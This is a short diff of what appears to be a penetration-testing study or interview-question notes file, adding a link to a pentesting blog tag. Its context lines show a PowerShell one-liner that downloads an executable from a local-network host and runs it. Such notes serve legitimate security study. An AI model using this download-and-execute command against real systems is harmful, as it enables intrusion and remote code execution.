@@ -61,6 +61,7 @@ Now that you have the creds, how did you get them? From what insecure package?<B
   PowerShell (New-Object System.Net.WebClient).DownloadFile('http://192.168.168.110/yourpayload.exe','yourpayload.exe');Start-Process 'yourpayload.exe'
 
 19. How did you find missing patches before?<BR>
-  
+
+20. https://pentestlab.blog/tag/sysret
   
   
